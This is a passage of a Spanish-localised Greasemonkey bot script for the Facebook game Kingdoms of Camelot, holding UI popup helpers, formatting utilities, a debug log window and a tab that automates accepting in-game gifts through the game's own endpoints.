function parseIntNan (n){
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x;
}
function parseIntZero (n){
  n = n.trim();
  if (n == '')
    return 0;
  return parseInt(n, 10);
}


function getFirefoxVersion (){
  var ver='', i;
  var ua = navigator.userAgent;
  if (ua==null || (i = ua.indexOf('Firefox/'))<0)
    return;
  return ua.substr(i+8);
}

var WinManager = {
  wins : {},    // prefix : CPopup obj
  didHide : [],


  get : function (prefix){
    var t = WinManager;
    return t.wins[prefix];
  },

  add : function (prefix, pop){
    var t = WinManager;
    t.wins[prefix] = pop;
    if (unsafeWindow.cpopupWins == null)
      unsafeWindow.cpopupWins = {};
    unsafeWindow.cpopupWins[prefix] = pop;
  },

  hideAll : function (){
    var t = WinManager;
    t.didHide = [];
    for (k in t.wins){
      if (t.wins[k].isShown()){
        t.didHide.push (t.wins[k]);
        t.wins[k].show (false);
      }
    }
  },
  restoreAll : function (){
    var t = WinManager;
    for (var i=0; i<t.didHide.length; i++)
      t.didHide[i].show (true);
  },

  delete : function (prefix){
    var t = WinManager;
    delete t.wins[prefix];
    delete unsafeWindow.cpopupWins[prefix];
  }
}


// creates a 'popup' div
// prefix must be a unique (short) name for the popup window
function CPopup (prefix, x, y, width, height, enableDrag, onClose) {
  var pop = WinManager.get(prefix);
  if (pop){
    pop.show (false);
    return pop;
  }
  this.BASE_ZINDEX = 111111;

  // protos ...
  this.show = show;
  this.toggleHide = toggleHide;
  this.getTopDiv = getTopDiv;
  this.getMainTopDiv = getMainTopDiv;
  this.getMainDiv = getMainDiv;
  this.getLayer = getLayer;
  this.setLayer = setLayer;
  this.setEnableDrag = setEnableDrag;
  this.getLocation = getLocation;
  this.setLocation = setLocation;
  this.focusMe = focusMe;
  this.isShown = isShown;
  this.unfocusMe = unfocusMe;
  this.centerMe = centerMe;
  this.destroy = destroy;
  this.autoHeight = autoHeight;

  // object vars ...
  this.div = document.createElement('div');
  this.prefix = prefix;
  this.onClose = onClose;

  var t = this;
  this.div.className = 'CPopup '+ prefix +'_CPopup';
  this.div.id = prefix +'_outer';
  this.div.style.background = "#fff";
  this.div.style.zIndex = this.BASE_ZINDEX        // KOC modal is 100210 ?
  this.div.style.display = 'none';
  this.div.style.width = width + 'px';
  this.div.style.height = height + 'px';
  this.div.style.maxHeight = height + 'px';
  this.div.style.overflowY = 'hidden';
  this.div.style.position = "absolute";
  this.div.style.top = y +'px';
  this.div.style.left = x + 'px';

  if (CPopUpTopClass==null)
    topClass = 'CPopupTop '+ prefix +'_CPopupTop';
  else
    topClass = CPopUpTopClass +' '+ prefix +'_'+ CPopUpTopClass;

  var m = '<TABLE cellspacing=0 width=100% height=100%><TR id="'+ prefix +'_bar" class="'+ topClass +'"><TD width=99% valign=bottom><SPAN id="'+ prefix +'_top"></span></td>\
      <TD id='+ prefix +'_X align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="color:#fff; background:#333; font-weight:bold; font-size:14px; padding:0px 5px">X</td></tr>\
      <TR><TD height=100% valign=top class="CPopMain '+ prefix +'_CPopMain" colspan=2 id="'+ prefix +'_main"></td></tr></table>';
  document.body.appendChild(this.div);
  this.div.innerHTML = m;
  document.getElementById(prefix+'_X').addEventListener ('click', e_XClose, false);
  this.dragger = new CWinDrag (document.getElementById(prefix+'_bar'), this.div, enableDrag);

  this.div.addEventListener ('mousedown', e_divClicked, false);
  WinManager.add(prefix, this);

  function e_divClicked (){
    t.focusMe();
  }
  function e_XClose (){
    t.show(false);
    if (t.onClose != null)
      t.onClose();
  }
  function autoHeight (onoff){
    if (onoff)
      t.div.style.height = '';
    else
      t.div.style.height = t.div.style.maxHeight;
  }
  function focusMe (){
    t.setLayer(5);
    for (k in unsafeWindow.cpopupWins){
      if (k != t.prefix)
        unsafeWindow.cpopupWins[k].unfocusMe();
    }
  }
  function unfocusMe (){
    t.setLayer(-5);
  }
  function getLocation (){
    return {x: parseInt(this.div.style.left), y: parseInt(this.div.style.top)};
  }
  function setLocation (loc){
    t.div.style.left = loc.x +'px';
    t.div.style.top = loc.y +'px';
  }
  function destroy (){
    document.body.removeChild(t.div);
    WinManager.delete (t.prefix);
  }
  function centerMe (parent){
    if (parent == null){
      var coords = getClientCoords(document.body);
    } else
      var coords = getClientCoords(parent);
    var x = ((coords.width - parseInt(t.div.style.width)) / 2) + coords.x;
    var y = ((coords.height - parseInt(t.div.style.height)) / 2) + coords.y;
    if (x<0)
      x = 0;
    if (y<0)
      y = 0;
    t.div.style.left = x +'px';
    t.div.style.top = y +'px';
  }
  function setEnableDrag (tf){
    t.dragger.setEnable(tf);
  }
  function setLayer(zi){
    t.div.style.zIndex = ''+ (this.BASE_ZINDEX + zi);
  }
  function getLayer(){
    return parseInt(t.div.style.zIndex) - this.BASE_ZINDEX;
  }
  function getTopDiv(){
    return document.getElementById(this.prefix+'_top');
  }
  function getMainDiv(){
    return document.getElementById(this.prefix+'_main');
  }
  function getMainTopDiv(){
  	return document.getElementById(this.prefix+'_top');
  }
  function isShown (){
    return t.div.style.display == 'block';
  }
  function show(tf){
    if (tf){
      t.div.style.display = 'block';
      t.focusMe ();
    } else {
      t.div.style.display = 'none';
    }
    return tf;
  }
  function toggleHide(t){
    if (t.div.style.display == 'block') {
      return t.show (false);
    } else {
      return t.show (true);
    }
  }
}

function CWinDrag (clickableElement, movingDiv, enabled) {
  var t=this;
  this.setEnable = setEnable;
  this.setBoundRect = setBoundRect;
  this.debug = debug;
  this.dispEvent = dispEvent;
  this.lastX = null;
  this.lastY = null;
  this.enabled = true;
  this.moving = false;
  this.theDiv = movingDiv;
  this.body = document.body;
  this.ce = clickableElement;
  this.moveHandler = new CeventMove(this).handler;
  this.outHandler = new CeventOut(this).handler;
  this.upHandler = new CeventUp(this).handler;
  this.downHandler = new CeventDown(this).handler;
  this.clickableRect = null;
  this.boundRect = null;
  this.bounds = null;
  this.enabled = false;
  if (enabled == null)
    enabled = true;
  this.setEnable (enabled);

  function setBoundRect (b){    // this rect (client coords) will not go outside of current body
    this.boundRect = boundRect;
    this.bounds = null;
  }

  function setEnable (enable){
    if (enable == t.enabled)
      return;
    if (enable){
      clickableElement.addEventListener('mousedown',  t.downHandler, false);
      t.body.addEventListener('mouseup', t.upHandler, false);
    } else {
      clickableElement.removeEventListener('mousedown', t.downHandler, false);
      t.body.removeEventListener('mouseup', t.upHandler, false);
    }
    t.enabled = enable;
  }

  function CeventDown (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.bounds == null){
        t.clickableRect = getClientCoords(clickableElement);
        t.bodyRect = getClientCoords(document.body);
        if (t.boundRect == null)
          t.boundRect = t.clickableRect;
        t.bounds = {top:10-t.clickableRect.height, bot:t.bodyRect.height-25, left:40-t.clickableRect.width, right:t.bodyRect.width-25};
      }
      if (me.button==0 && t.enabled){
        t.body.addEventListener('mousemove', t.moveHandler, true);
        t.body.addEventListener('mouseout', t.outHandler, true);
        t.lastX = me.clientX;
        t.lastY = me.clientY;
        t.moving = true;
      }
    }
  }

  function CeventUp  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0 && t.moving)
        _doneMoving(t);
    }
  }

  function _doneMoving (t){
    t.body.removeEventListener('mousemove', t.moveHandler, true);
    t.body.removeEventListener('mouseout', t.outHandler, true);
    t.moving = false;
  }

  function CeventOut  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0){
        t.moveHandler (me);
      }
    }
  }

  function CeventMove (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.enabled && !t.wentOut){
        var newTop = parseInt(t.theDiv.style.top) + me.clientY - t.lastY;
        var newLeft = parseInt(t.theDiv.style.left) + me.clientX - t.lastX;
        if (newTop < t.bounds.top){     // if out-of-bounds...
          newTop = t.bounds.top;
          _doneMoving(t);
        } else if (newLeft < t.bounds.left){
          newLeft = t.bounds.left;
          _doneMoving(t);
        } else if (newLeft > t.bounds.right){
          newLeft = t.bounds.right;
          _doneMoving(t);
        } else if (newTop > t.bounds.bot){
          newTop = t.bounds.bot;
          _doneMoving(t);
        }
        t.theDiv.style.top = newTop + 'px';
        t.theDiv.style.left = newLeft + 'px';
        t.lastX = me.clientX;
        t.lastY = me.clientY;
      }
    }
  }

  function debug  (msg, e){
    logit ("*************** "+ msg +" ****************");
    logit ('clientWidth, Height: '+ e.clientWidth +','+ e.clientHeight);
    logit ('offsetLeft, Top, Width, Height (parent): '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' ('+ e.offsetParent +')');
    logit ('scrollLeft, Top, Width, Height: '+ e.scrollLeft +','+ e.scrollTop +','+ e.scrollWidth +','+ e.scrollHeight);
  }

  function dispEvent (msg, me){
    logit (msg + ' Button:'+ me.button +' Screen:'+ me.screenX +','+ me.screenY +' client:'+  me.clientX +','+ me.clientY +' rTarget: '+ me.relatedTarget);
  }
}

function inspect(obj, maxLevels, level, doFunctions){
  var str = '', type, msg;
  if(level == null)  level = 0;
  if(maxLevels == null) maxLevels = 1;
  if(maxLevels < 1)
      return 'Inspeccione error: El numero de nivel debe ser mayor que 0';
  if(obj == null)
    return 'ERROR: El Objecto is NULO\n';
  var indent = '';
  for (var i=0; i<level; i++)
    indent += '  ';
  for(property in obj) {
    try {
        type =  matTypeof(obj[property]);
        if (doFunctions==true && (type == 'function')){
          str += indent + '(' + type + ') ' + property + "[FUNCTION]\n";
        } else if (type != 'function') {
          str += indent + '(' + type + ') ' + property + ( (obj[property]==null)?(': null'):('')) +' = '+ obj[property] +"\n";
        }
        if((type=='object' || type=='array') && (obj[property] != null) && (level+1 < maxLevels))
          str += inspect(obj[property], maxLevels, level+1, doFunctions);  // recurse
    }
    catch(err) {
      // Is there some properties in obj we can't access? Print it red.
      if(typeof(err) == 'string') msg = err;
      else if(err.message)        msg = err.message;
      else if(err.description)    msg = err.description;
      else                        msg = 'Unknown';
      str += '(Error) ' + property + ': ' + msg +"\n";
    }
  }
  str += "\n";
  return str;
}

Array.prototype.compare = function(testArr) {
    if (this.length != testArr.length) return false;
    for (var i = 0; i < testArr.length; i++) {
        if (this[i].compare) {
            if (!this[i].compare(testArr[i])) return false;
        }
        if (this[i] !== testArr[i]) return false;
    }
    return true;
}
String.prototype.StripQuotes = function() {
	return this.replace(/"/g,'');
}
String.prototype.entityTrans = { '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;', '\'':'&#039' };
String.prototype.htmlSpecialChars = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret  = ret.split(k).join(this.entityTrans[k]);
  return ret;
}
String.prototype.htmlSpecialCharsDecode = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret = ret.split(this.entityTrans[k]).join(k);
  return ret;
}
String.prototype.trim = function () {
    return this.replace(/^\s*/, "").replace(/\s*$/, "");
}

function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3)
    return 'Representante';
  else if (oid==2)
    return 'Vice Canciller';
  else if (oid==1)
    return 'Canciller';
  return '';
}

function getResourceProduction (cityId){
  var ret = [0,0,0,0,0];
  var now = unixTime ();

  var wilds = [0, 0, 0, 0, 0];
  var w = Seed.wilderness["city" + cityId];
  for (var k in w){
    var type = parseInt(w[k].tileType);
    if (type==10 || type==11)
      wilds[1] += parseInt(w[k].tileLevel);
    else
      wilds[type/10] += parseInt(w[k].tileLevel);
  }

  knight = 0;
  var s = Seed.knights["city" + cityId];
  if (s) {
    s = s["knt" + Seed.leaders["city" + cityId].resourcefulnessKnightId];
    if (s){
      var knight = parseInt(s.resourcefulness);
      if (s.resourcefulnessBoostExpireUnixtime > now)
        knight *= 1.25;
    }
  }
  var workerFactor = 1;
  var c = parseInt(Seed.citystats["city" + cityId]["pop"][0]);  // Current  population
  var w = parseInt(Seed.citystats["city" + cityId]["pop"][3]);  // Labor force
  if (w > c)
    workerFactor = c / w;

  for (var i=1; i<5; i++){
    var usage = Seed.resources["city" + cityId]["rec" + i];
    var items = 0;
    if (parseInt(Seed.playerEffects["r" + i + "BstExp"]) > now) {
      items = 0.25;
    }
    var tech = Seed.tech["tch" + i];
    ret[i] = parseInt((usage[2] * (1 + tech/10 + knight/100 + items + 0.05 * wilds[i]) * workerFactor + 100));
  }
  return ret;
}

function objectName (o){
  var s = o.toString();
  return s.substr(7,s.length-8);
}

function matTypeof (v){
  if (typeof (v) == 'object'){
    if (!v)
      return 'null';
//    else if (unsafeWindow.Object.prototype.toString.apply(v) === '[object Array]')
    else if (v.constructor.toString().indexOf("Array")>=0 && typeof(v.splice)=='function')
      return 'array';
    else return 'object';
  }
  return typeof (v);
}

function updatebotbutton(text, id)
{
	var but=document.getElementById(id);
	but.innerHTML = '<span style="color: #ff6">'+text+'</span>';
}



function tbodyScroller (tbody, maxHeight){
  tbody.style.maxHeight = '';
  tbody.style.height = '';
  tbody.style.overflowX = 'hidden';
  if (parseInt(tbody.clientHeight) > maxHeight){
    tbody.style.height = maxHeight + 'px';
    tbody.style.maxHeight = maxHeight + 'px';
    tbody.style.overflowY = 'auto';
  }
}
function getRemainingHeight (e, cont){
  var ec = getClientCoords(e);
  var cc = getClientCoords(cont);
  return cont.clientHeight - (ec.y - cc.y);
}


function addCommasInt(n){
  nStr = parseInt(n) + '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(nStr)) {
    nStr = nStr.replace(rgx, '$1' + ',' + '$2');
  }
  return nStr;
}

function addCommas(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1 + x2;
}

function unixTime (){
  return parseInt (new Date().getTime() / 1000) + unsafeWindow.g_timeoff;
}
function htmlOptions (a, curVal){
  m = '';
  for (k in a)
    m += '<OPTION value="'+ k +'"'+ (k==curVal?' SELECTED':'')  +'>'+ a[k] +'</option>';
  return m;
}
function getFunctionName (func){
  var name=/\W*function\s+([\w\$]+)\(/.exec(func);
  if (!name)
    return '';
  return name[1];
}

function findAllBetween (txt, find1, find2){
  var m = [];
  var last = 0;
  while ( (i1=txt.indexOf(find1, last))>=0 && (i2=txt.indexOf (find2, i1))>=0 ) {
    m.push (txt.substring(i1+find1.length, i2));
    last = i2 + find2.length;
  }
  return m;
}

function strUpTo (s, find){
  var i = s.indexOf(find);
  if (i > 0)
    return s.substr(0, i);
  return s;
}

/********
 Xd Xh
 Xh Xm
 Xm Xs
 Xs
********/
function timestrShort(time) {
  time = parseInt (time);
  if (time > 86400){
    var m = [];
    time /= 3600;
    m.push (parseInt(time/24));
    m.push ('d ');
    m.push (parseInt(time%24));
    m.push ('h ');
    return m.join ('');
  } else
    return timestr (time);
}

/**********************
 part       full
 Xd Xh Xm   Xd Xh Xm Xs
 Xh Xm      Xh Xm Xs
 Xm Xs      Xm Xs
 Xs         Xs
**********************/
function timestr(time, full) {
  time = parseInt (time);
  var m = [];
  var t = time;
  if (t < 61)
    return  t + 's';
  if (t > 86400){
    m.push (parseInt(t/86400));
    m.push ('d ');
    t %= 86400;
  }
  if (t>3600 || time>3600){
    m.push (parseInt(t/3600));
    m.push ('h ');
    t %= 3600;
  }
  m.push (parseInt(t/60));
  m.push ('m');
  if (full || time<=3600 ){
    m.push (' ');
    m.push (t%60);
    m.push ('s');
  }
  return m.join ('');
}

/************  LIB singletons .... **************/
// TODO: fix REopening window
var WINLOG_MAX_ENTRIES = 1000;     // TODO
var WinLog = {
  state : null,
  win: null,
  eOut : null,
  lastE : null,
  enabled : true,
  reverse : true,
  busy : false,
isOpening : false,

  open : function (){
    var t = WinLog;

    function eventButClear(){
      var t = WinLog;
      t.lastE = null;
      t.eOut.innerHTML ='';
    }
    function eventButReverse(){
      var t = WinLog;
      if (t.busy)
        return;
      t.busy = true;
      if (t.reverse){
        t.win.document.getElementById('wlRev').value= 'Top';
        t.reverse = false;
      } else{
        t.win.document.getElementById('wlRev').value= 'Bottom';
        t.reverse = true;
      }
      var n = t.eOut.childNodes.length;
      if (n < 2)
        return;
      for (i=n-2; i>=0; i--){
        t.eOut.appendChild (t.eOut.childNodes[i]);
      }
      t.busy = false;
    }

    if (!t.win || t.win.closed){
t.isOpening = true;
// Firefox bug??? It appears as if a new thread is started on open, withOUT reusing same window? huh?
      t.win = window.open('', 'uwtrace', 'top=30,left=0,width=900,height=700,scrollbars=no,location=no,menubar=no,directories=no,status=no');
t.isOpening = false;
t.state = null;
    }

    if (t.state == null){
      t.win.document.body.innerHTML = '<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; color:#cee; background-color:#cee}</style>\
        <BODY style="margin:0px; padding:0px; border:none">\
        <DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid">\
        <INPUT id=wlClear type=submit value="Clear"> &nbsp; <INPUT id=wlRev type=submit value="Bottom"></div>\
        <DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>';
      t.win.document.getElementById('wlClear').addEventListener('click', eventButClear, false);
      t.win.document.getElementById('wlRev').addEventListener('click', eventButReverse, false);
      t.eOut =  t.win.document.getElementById('wlOut');
      t.lastE = null;
      t.state = 1;
    }
  },

  writeText : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.write (msg.htmlSpecialChars());
  },

  write : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.open();
    var te = document.createElement('pre');
    var now = new Date();
    var m = [];
    var millis = now.getMilliseconds();
    m.push (now.toTimeString().substring (0,8));
    m.push ('.');
    if (millis<100)
      m.push('0');
    if (millis<10)
      m.push('0');
    m.push(millis);
    m.push (': ');
    m.push (msg);
    te.innerHTML = m.join('');
    if (t.reverse){
      if (t.lastE == null){
        t.eOut.appendChild(te);
        t.lastE = te;
      } else {
        t.eOut.insertBefore(te, t.lastE);
      }
      var hr = document.createElement('hr');
      t.eOut.insertBefore(hr, te);
      t.lastE = hr;
    } else {
      t.eOut.appendChild(te);
      t.eOut.appendChild(document.createElement('hr'));
    }
  },

};


/*********************************** Gifts TAB ***********************************/
function explodeUrlArgs (url){
  var i = url.indexOf ('?');
  var a = url.substr(i+1).split ('&');
  var args = {};
  for (i=0; i<a.length; i++){
    var s = a[i].split ('=');
    args[s[0]] = s[1];
  }
  return args;
}

// returns: page text or null on comm error
function GM_AjaxPost (url, args, notify, label){
  if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ('GM_AjaxPost ('+ label +'): ' + url +'\n'+ inspect (args, 5, 1));
  GM_xmlhttpRequest({
    method: "post",
    url: url,
    data: implodeUrlArgs(args),
    headers: { "Content-Type": "application/x-www-form-urlencoded", 'X-Requested-With': 'XMLHttpRequest', 'X-Prototype-Version': '1.6.1',
               'Accept': 'text/javascript, text/html, application/xml, text/xml, */*' },
    onload: function (rslt) {
      if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ( 'GM_AjaxPost.onLoad ('+ label +'):\n '  + inspect (rslt, 6, 1));
      notify (rslt.responseText);
    },
    onerror: function () {
	  notify (null);
    },
  });
}

// returns: page text or null on comm error
function GM_AjaxGet (url, args, notify, label){
  if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ('GM_AjaxGet ('+ label +'): ' + url);
  GM_xmlhttpRequest({
    method: "get",
    url: addUrlArgs(url, args),
    onload: function (rslt) {
      if (ENABLE_GM_AJAX_TRACE) WinLog.writeText ( 'GM_AjaxGet.onLoad ('+ label +')  len='+ rslt.responseText.length +':\n '  + inspect (rslt, 6, 1));
      notify (rslt.responseText);
    },
    onerror: function () {
		notify (null);
    },
  });
}

Tabs.Gifts = {
  tabOrder : 3,
  tabLabel : 'Regalos',
  gifts : null,
  myDiv : null,
  doList : [], // list of gifts to accept
  doServer : 0,
  accepting : false,

  init : function (div){
    var t = Tabs.Gifts;
    t.myDiv = div;
    div.innerHTML = '<TABLE cellpadding=0 cellspacing=0 class=pbTab width=100%><TR><TD width=200></td><TD align=center><INPUT id="pasubGifts" type=submit value="Chequear" \></td><TD width=200 align=right><INPUT id=paGiftHelp type=submit value=AYUDA></td></tr></table><HR>\
        <DIV id=giftDiv style="width:100%; min-height:300px; height:100%">';
    document.getElementById('pasubGifts').addEventListener ('click', t.e_clickedGifts, false);
    document.getElementById('paGiftHelp').addEventListener ('click', t.helpPop, false);
    if (!Options.giftDomains.valid)
      Options.giftDomains.list[getServerId()] = unsafeWindow.domainName;
  },

  show : function (){
  },
  hide : function (){
  },

  helpPop : function (){
    var helpText = '<BR>El script de REGALOS le ayuda a aceptar los regalos con más fácilidad que ir a través de Facebook. Usa primero el Boton \'Chequear\'.\
		Esto obtendra los regalos de la pagina de Facebook y listara todos los regalos de KofC que esten avalados.<BR><BR>\
        En la lista marca todos los regalos que tu quieras aceptar o presiona el boton \'TODOS\' para seleccionarlos todos.  Debes asegurarte de seleccionar bien el tu dominio. Si quieres borrar los regalos despues de aceptarlos activa la opción \'Borrar regalos\'\
        o la de  \'siempre\'. Despues, presiona el botón \'Aceptar Regalos\' para recivir los regalos seleccionados.  Tenga en cuenta que este proceso lleva algún tiempo ya que hay cuatro páginas web \
        a las que se accede por cada regalo!<BR><BR>\
        NOTAS:<UL><LI>La página de Facebook solo deja una lista de regalos de hasta 100 para <B> todas </ b> de las aplicaciones de su juego. Esto significa que sólo algunos de los regalos de KofC\
        seran avalados para ser listados. Acepta los regalos, chequea de nuevo \'Chequear\' para verlos y mostrara mas!<p>\
        <LI>Si tu cambias a no borrar regalos despues de aceptarlos, pueden estar avalados de nuevo! Despues de completar el proceso, presione el boton\
        \'Chequear regalos\' de nuevo y vera que los regalos estan avalado.</ul>';

    var pop = new CPopup ('giftHelp', 0, 0, 500, 400, true);
    pop.centerMe (mainPop.getMainDiv());
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<CENTER><B>Ayuda de Power Bot</b>: Aceptando regalos</center>';
    pop.show (true);
  },


  e_clickedGifts : function  (){     // (also cancel accepting)
    var t = Tabs.Gifts;
    if (t.accepting){
      document.getElementById('pasubGifts').value = 'Chequear';
      document.getElementById('giftDiv').innerHTML+= '<BR><SPAN class=boldRed>Cancelar.</span>';
      t.accepting = false;
      return;
    }
    document.getElementById('giftDiv').innerHTML = 'Captando regalos de la página de Facebook ...';

    t.fetchGiftsPage (gotGiftsPage);
    function gotGiftsPage(rslt){
      if (rslt.errMsg){
        document.getElementById('giftDiv').innerHTML += rslt.errMsg;
        return;
      }
      t.gifts = rslt;
      if (!Options.giftDomains.valid && t.gifts.length>0){
        t.ajaxGetGiftData (t.gifts[0], listGifts, function (){});    // try to get domain list ... don't delete gift!
        return;
      }
      listGifts();
    }

    function listGifts (){
//logit ("LIST GIFTS");
//logit (inspect (t.gifts, 8, 1));
      var m = '<DIV class=pbStat><CENTER>Regalos de KofC encontrados &nbsp; &nbsp; &nbsp; ('+ t.gifts.length +' encontrados)</center></div>';
      if (t.gifts.length<1){
        document.getElementById('giftDiv').innerHTML = m + '<BR><BR><CENTER>No se encontraron regalos!</center>';
        return;
      }
      m += '<TABLE class=pbTab align=center><TR><TD align=right>Aplicar regalos al dominio: </td><TD>'
        + htmlSelector (Options.giftDomains.list, getServerId(), 'id=pbGiftServers') +'</td></tr>\
          <TR><TD align=right>Borrar regalo despues de haceptar</td><TD>'
        + htmlSelector ({y:'Siempre', e:'Solo si Error', n:'Nunca'}, Options.giftDelete, 'id=pbGiftDel')
        + '</td></tr><TR><TD>Selecciona los regalos que tu quieres aceptar y pulsa: </td><TD width=250><INPUT type=submit id=pbGiftDo value="Aceptar Regalos">\
        &nbsp; <SPAN id=pbGiftNone class=boldRed></span></td></tr></table><HR><TABLE class=pbTab><TR valign=top><TD>\
        <INPUT id=pbGiftButAll type=submit value="TODOS" style="width:100%; margin-bottom:5px"><BR><INPUT id=pbGiftButNone type=submit value="Ninguno"></td>\
        <TD width=10></td><TD><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabLined>\
        <TBODY id=pbGiftTbody>\
        <TR style="font-weight:bold; background:white"><TD>Regalo</td><TD>Fecha</td><TD>desde(dominio)</td><TD width=20></td></tr>';
      t.gifts.sort (function (a,b){  // sort by gift name, date
          var x = a.gift.localeCompare (b.gift);
          if (x != 0)
            return x;
          return a.args.da.localeCompare(b.args.da);
          });
      for (var i=0; i<t.gifts.length; i++){
        var giftName = t.gifts[i].gift;
        if (t.gifts[i].args.si == 9)
          giftName += ' (Daily)';
        var date = t.gifts[i].args.da.substr(0,4) +'-'+ t.gifts[i].args.da.substr(4,2) +'-'+ t.gifts[i].args.da.substr(6,2);
        m += '<TR><TD><INPUT type=checkbox id=pbgchk_'+ i +'> &nbsp;'+ giftName +'</td><TD>'+ date +'</td>\
              <TD>'+ t.gifts[i].giver +' ('+ t.gifts[i].args.exs +')</td></tr>';
      }
      document.getElementById('giftDiv').innerHTML = m + '</tbody></table></td></tr></table>';
      document.getElementById('pbGiftDo').addEventListener ('click', t.getErDone, false);
      document.getElementById('pbGiftButAll').addEventListener ('click', t.e_butAll, false);
      document.getElementById('pbGiftButNone').addEventListener ('click', t.e_butNone, false);
      var tbody = document.getElementById('pbGiftTbody');
      tbodyScroller (tbody, getRemainingHeight (tbody, mainPop.div));
    }
  },

  e_butAll : function (){
    var t = Tabs.Gifts;
    for (var i=0; i<t.gifts.length; i++)
      document.getElementById('pbgchk_'+i).checked = true;
  },

  e_butNone : function (){
    var t = Tabs.Gifts;
    for (var i=0; i<t.gifts.length; i++)
      document.getElementById('pbgchk_'+i).checked = false;
  },

  getErDone : function (){
    var t = Tabs.Gifts;
    t.doList = [];
    document.getElementById('pbGiftNone').innerHTML = '';
    Options.giftDelete = document.getElementById('pbGiftDel').value;
    for (var i=0; i<t.gifts.length; i++){
      if (document.getElementById('pbgchk_'+i).checked)
        t.doList.push (t.gifts[i]);
    }
    if (t.doList.length==0){
      document.getElementById('pbGiftNone').innerHTML = 'No selecciono ninguno!';
      return;
    }
    t.doServer = document.getElementById('pbGiftServers').value;
    t.accepting = true;
    document.getElementById('pasubGifts').value = 'Parar de Aceptar';
    document.getElementById('giftDiv').innerHTML = '<DIV id=acpDiv style="height:400px; max-height:400px; overflow-y:auto"><B>Aceptando '+ t.doList.length +' regalos:</b><BR></div>';
    t.acceptNext ();
  },


  allDone : function (msg){
    var t = Tabs.Gifts;
    document.getElementById('acpDiv').innerHTML += '<BR><BR>' + msg;
    document.getElementById('pasubGifts').value = 'Chequear';
    t.accepting = false;
  },


  acceptNext : function (){
    var t = Tabs.Gifts;
    var gift = t.doList.shift();
    if (gift == null){
      t.allDone ('Se termino de aceptar regalos.');
      return;
    }
    var acpDiv = document.getElementById('acpDiv');
    var curDiv = document.createElement ('div');
    acpDiv.appendChild (curDiv);
    curDiv.innerHTML = '<B>'+ gift.gift +'</b> desde '+ gift.giver +' enviado el '+ gift.args.da.substr(0,4) +'-'+ gift.args.da.substr(4,2) +'-'+ gift.args.da.substr(6,2) +': ';
    var statSpan = document.createElement ('span');
    curDiv.appendChild (statSpan);
    statSpan.innerHTML = 'Obteniendo datos ';
    t.ajaxGetGiftData (gift, gotGiftData, progress);

    function progress (m){
      if (t.accepting)
        statSpan.innerHTML += ' '+m;
    }

    function gotGiftData (rslt){
//logit ("getErDone.gotGiftData ... \n"+ inspect (gift, 8, 1));
      if (!t.accepting)
        return;
      if (rslt.ok){
        statSpan.innerHTML += ' &nbsp; Aceptando .';
        t.ajaxAcceptGift (gift, t.doServer, doneAccepting);
        return;
      }

      if (rslt.feedback)
        msg = '<B>'+ rslt.feedback + '</b>';
      else
        msg = '<SPAN class=boldRed>ERROR: '+ rslt.ajaxErr +'</span>';
      if (rslt.del && Options.giftDelete!='n'){
        t.deleteGift (gift);
        msg += ' Regalo borrado.';
      }
      curDiv.removeChild (statSpan);
      curDiv = document.createElement ('div');
      curDiv.className = 'indent25';
      acpDiv.appendChild (curDiv);
      curDiv.innerHTML = msg;
      t.acceptNext ();
    }

    function doneAccepting (rslt){
      if (!t.accepting)
        return;
      var msg = 'OK.';
      if (rslt.ok)
        actionLog ('Regalo aceptado:  '+ gift.gift +' desde '+ gift.giver +' enviado el '+ gift.args.da.substr(0,4) +'-'+ gift.args.da.substr(4,2) +'-'+ gift.args.da.substr(6,2)     );
      else
        msg = '<SPAN class=boldRed>'+ rslt.msg +'</span>';
      statSpan.innerHTML = msg;
      if (Options.giftDelete=='y'){
        statSpan.innerHTML += ' &nbsp; Borrado.';
        t.deleteGift (gift);
      }
      t.acceptNext ();
    }
  },



  ajaxAcceptGift : function (gift, serverId, notify){
    var url;
    var pargs = {};

    if (gift.dat.ver == 1){
      url = gift.dat.url;
      pargs.giftId = gift.dat.giftId;
      pargs.hasExistingServer = 1;
      pargs.serverid = serverId;
      pargs.go = 'Next';
      GM_AjaxPost (url, pargs, ver1GotPost, 'Accept');
    } else {
      var i = gift.dat.url.indexOf('src/');
      url = gift.dat.url.substr(0,i) +'src/ajax/claimgift.php?wcfbuid='+ gift.dat.wcfbuid;
      pargs = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      pargs.fb_sig_ext_perms = unescape(pargs.fb_sig_ext_perms);
      pargs.ver = '2';
      pargs.selectedS = serverId;
      pargs.giftinviteid = gift.dat.giftId;
      GM_AjaxPost (url, pargs, ver2GotPost, 'Accept');
     }

//  parse multiple reply formats .....
    function ver1GotPost (rslt){
      if (rslt == null){
        notify ({ok:false, msg:"AJAX Error"});
        return;
      }
      var m = /<div class=\'nm\'>(.*?)<\/div/im.exec(rslt);
      if (m)
        notify ({ok:false, msg: 'Got '+ m[1]});
      else
        notify ({ok:true, msg:'OK'});
    }
    function ver2GotPost (rslt){
      if (rslt == null){
